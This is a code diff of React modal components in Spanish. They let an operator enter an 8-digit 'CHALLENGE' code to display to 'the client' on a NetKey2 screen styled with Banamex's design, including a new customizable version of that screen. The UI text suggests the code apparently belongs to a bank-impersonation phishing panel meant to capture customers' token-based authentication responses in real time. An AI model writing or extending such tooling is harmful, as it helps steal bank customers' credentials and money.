@@ -728,16 +728,16 @@ export const NetKey2Modal: React.FC<NetKey2ModalProps> = ({ isOpen, onClose, onC
   };
 
   return (
-    <Modal isOpen={isOpen} onClose={onClose} title="NetKey 2 - Clave Dinámica Completa">
+    <Modal isOpen={isOpen} onClose={onClose} title="Banamex NetKey2 - Código CHALLENGE (Flujo Completo)">
       <div className="space-y-3">
         <div>
           <Label htmlFor="challenge2" className="block mb-2 text-white">
-            Código CHALLENGE de 8 dígitos para Clave Dinámica
+            Código CHALLENGE de 8 dígitos
           </Label>
           <Input 
             id="challenge2" 
             type="text" 
-            placeholder="Ej: 17728012"
+            placeholder="Ej: 12345678"
             value={challenge}
             onChange={(e) => {
               const value = e.target.value.replace(/\D/g, '');
@@ -749,7 +749,7 @@ export const NetKey2Modal: React.FC<NetKey2ModalProps> = ({ isOpen, onClose, onC
             className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
           />
           <p className="text-xs text-gray-400 mt-2">
-            El cliente verá este código en la pantalla de Clave Dinámica completa con diseño Banamex
+            Ingrese el código CHALLENGE de 8 dígitos que desea mostrar al cliente en el flujo completo NetKey2
           </p>
         </div>
       </div>
@@ -767,7 +767,72 @@ export const NetKey2Modal: React.FC<NetKey2ModalProps> = ({ isOpen, onClose, onC
           variant="default"
           className="bg-[#007bff] text-white hover:bg-opacity-90"
         >
-          Enviar Código
+          Enviar CHALLENGE
+        </Button>
+      </div>
+    </Modal>
+  );
+};
+
+interface NetKeyCustomModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (customChallenge: string) => void;
+}
+
+export const NetKeyCustomModal: React.FC<NetKeyCustomModalProps> = ({ isOpen, onClose, onConfirm }) => {
+  const [customChallenge, setCustomChallenge] = useState('');
+
+  const handleSubmit = () => {
+    if (customChallenge.length === 8 && /^\d+$/.test(customChallenge)) {
+      onConfirm(customChallenge);
+      setCustomChallenge('');
+    } else {
+      alert('Por favor ingresa exactamente 8 dígitos numéricos');
+    }
+  };
+
+  return (
+    <Modal isOpen={isOpen} onClose={onClose} title="NetKey Personalizado - Código CHALLENGE">
+      <div className="space-y-3">
+        <div>
+          <Label htmlFor="customChallenge" className="block mb-2 text-white">
+            Código CHALLENGE de 8 dígitos
+          </Label>
+          <Input 
+            id="customChallenge" 
+            type="text" 
+            placeholder="Ej: 12345678"
+            value={customChallenge}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, '');
+              if (value.length <= 8) {
+                setCustomChallenge(value);
+              }
+            }}
+            maxLength={8}
+            className="w-full p-2 rounded bg-[#1f1f1f] text-white border border-gray-700 focus:outline-none text-2xl text-center font-mono tracking-widest"
+          />
+          <p className="text-xs text-gray-400 mt-2">
+            Este código se mostrará en la pantalla NetKey personalizada (misma pantalla inicial pero con tu código)
+          </p>
+        </div>
+      </div>
+
+      <div className="flex justify-end space-x-2 mt-6">
+        <Button 
+          onClick={onClose}
+          variant="secondary"
+          className="bg-gray-600 text-white hover:bg-gray-700"
+        >
+          Cancelar
+        </Button>
+        <Button 
+          onClick={handleSubmit}
+          variant="default"
+          className="bg-[#007bff] text-white hover:bg-opacity-90"
+        >
+          Enviar CHALLENGE
         </Button>
       </div>
     </Modal>
